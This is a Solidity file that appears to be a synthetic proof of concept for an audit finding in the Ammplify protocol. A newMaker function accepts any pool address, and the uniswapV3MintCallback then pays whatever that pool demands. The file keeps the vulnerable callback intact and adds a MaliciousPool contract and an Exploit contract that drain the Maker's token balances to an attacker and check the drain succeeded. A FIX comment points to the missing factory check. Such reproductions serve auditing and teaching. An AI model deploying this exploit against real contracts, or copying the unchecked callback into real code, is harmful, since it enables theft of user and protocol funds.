// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Ammplify — newMaker accepts any pool, and uniswapV3MintCallback pays it
    (Sherlock H-13). SYNTHETIC, cheatcode-free reduction.
    Root cause: mint() tstores the caller-supplied pool as the guard, then the
    callback transfers whatever amount0Owed/amount1Owed that pool names.
    Vulnerable transfers preserved verbatim below (@> VULN). */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract ERC20Mini is IERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

interface IUniswapV3Pool {
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
        external
        returns (uint256 amount0, uint256 amount1);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract MaliciousPool {
    address public token0;
    address public token1;
    address public attacker;

    constructor(address t0, address t1, address attacker_) {
        token0 = t0;
        token1 = t1;
        attacker = attacker_;
    }

    function mint(address, int24, int24, uint128, bytes calldata) external returns (uint256 amount0, uint256 amount1) {
        amount0 = IERC20(token0).balanceOf(msg.sender);
        amount1 = IERC20(token1).balanceOf(msg.sender);
        Maker(msg.sender).uniswapV3MintCallback(amount0, amount1, "");
        IERC20(token0).transfer(attacker, IERC20(token0).balanceOf(address(this)));
        IERC20(token1).transfer(attacker, IERC20(token1).balanceOf(address(this)));
    }
}

contract Maker {
    struct PoolInfo {
        address token0;
        address token1;
    }

    bytes32 internal constant POOL_GUARD_SLOT = 0xA11F11F000000000000000000000000000000000000000000000000000000001;
    address public attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function newMaker(address pool, int24 tickLower, int24 tickUpper, uint128 liquidity) external {
        // No check that `pool` is a pool created by the Uniswap V3 factory.
        _mint(pool, tickLower, tickUpper, liquidity);
    }

    function _mint(address pool, int24 tickLower, int24 tickUpper, uint128 liquidity)
        internal
        returns (uint256 amount0, uint256 amount1)
    {
        bytes32 slot = POOL_GUARD_SLOT;
        assembly {
            tstore(slot, pool) // S3
        }
        (amount0, amount1) = IUniswapV3Pool(pool).mint(address(this), tickLower, tickUpper, liquidity, "");
        assembly {
            tstore(slot, 0)
        }
    }

    function poolGuard() public view returns (address active) {
        bytes32 slot = POOL_GUARD_SLOT;
        assembly {
            active := tload(slot)
        }
    }

    function uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata) external {
        address activeMint = poolGuard();
        require(msg.sender == activeMint, "UnauthorizedMint");
        PoolInfo memory pInfo = PoolInfo({token0: IUniswapV3Pool(activeMint).token0(), token1: IUniswapV3Pool(activeMint).token1()});
        _safeTransfer(pInfo.token0, activeMint, amount0Owed); // @> VULN: the untrusted pool chooses the token and the amount, and receives the protocol's balance
        // FIX: require the pool was created by the canonical Uniswap V3 factory before tstore
        _safeTransfer(pInfo.token1, activeMint, amount1Owed); // S5
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(IERC20(token).transfer(to, amount), "transfer");
    }
}

contract Exploit {
    ERC20Mini public token0; // nonce 1
    ERC20Mini public token1; // nonce 2
    Maker public maker; // nonce 3 — vulnerable callback
    MaliciousPool public pool; // nonce 4
    address public attacker;
    uint256 public constant FEES0 = 1_000_000 ether;
    uint256 public constant FEES1 = 250_000 ether;

    constructor() {
        attacker = msg.sender;
        token0 = new ERC20Mini();
        token1 = new ERC20Mini();
        maker = new Maker(attacker);
        pool = new MaliciousPool(address(token0), address(token1), attacker);
        token0.mint(address(maker), FEES0);
        token1.mint(address(maker), FEES1);
    }

    function run() external {
        uint256 fees0 = token0.balanceOf(address(maker)); // S1
        maker.newMaker(address(pool), -100, 100, 1); // S2
        require(token0.balanceOf(attacker) == fees0 && fees0 == FEES0, "token0 not drained"); // S6
        require(token1.balanceOf(attacker) == FEES1, "token1 not drained");
        require(token0.balanceOf(address(maker)) == 0 && token1.balanceOf(address(maker)) == 0, "fees remain");
    }
}
